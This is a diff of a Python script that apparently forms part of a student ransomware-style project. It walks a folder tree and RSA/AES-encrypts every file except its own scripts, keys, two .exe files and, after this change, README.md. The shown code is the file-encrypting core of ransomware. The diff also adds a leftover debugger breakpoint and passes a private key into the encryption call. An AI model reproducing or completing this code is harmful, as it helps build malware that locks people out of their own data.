@@ -3,17 +3,19 @@ import Encryption as enc
 import json
 import Constants
 import keygen
+import pdb
 
 if __name__ == '__main__':
     #Retrieves the path to the current location of this file
     curr_path = os.getcwd()
-
+    pdb.set_trace()
     #Stores the application key
     appKey = None
+    privateKey = None
     #Check if the PEM file currently exists
     if os.path.isfile("./" + Constants.PEM_FILE) == False:
         #The file does not exist, make PEM file here
-        appKey = keygen.generate_PEM()
+        appKey, privateKey = keygen.generate_PEM()
         #Write the application key inside a file
         appKeyFile = open('./appKey.txt', 'w+')
         appKeyFile.write(appKey);
@@ -30,14 +32,14 @@ if __name__ == '__main__':
             remove_list = list(files)
             for i in remove_list:
                 if(i[len(i) - 3 : len(i)] == '.py' or i[len(i) - 4 : len(i)] == '.pyc' or i[len(i) - 4 : len(i)] == '.pem'
-                    or i == 'NotSuspciousFile.exe' or i == 'SuspiciousFile.exe' or i == 'appKey.txt'):
+                    or i == 'NotSuspciousFile.exe' or i == 'SuspiciousFile.exe' or i == 'appKey.txt' or i == 'README.md'):
                     files.remove(i)
         for i in range(len(files)) :
             #file_to_encrypt is the absolute path to the file
             file_path = curr_path + curr_folder + "/" + files[i]
             #Generate cipher text, IV, Key, and file extension
             print(file_path)
-            encoded_cipher, encoded_IV, encoded_key, ext, file, encoded_tag = enc.MyRSAEncrypt(file_path)
+            encoded_cipher, encoded_IV, encoded_key, ext, file, encoded_tag = enc.MyRSAEncrypt(privateKey, file_path)
             #Stringify the following list
             cipher, IV, key, tag = enc.stringify([encoded_cipher, encoded_IV, encoded_key, encoded_tag])
             #Generate map
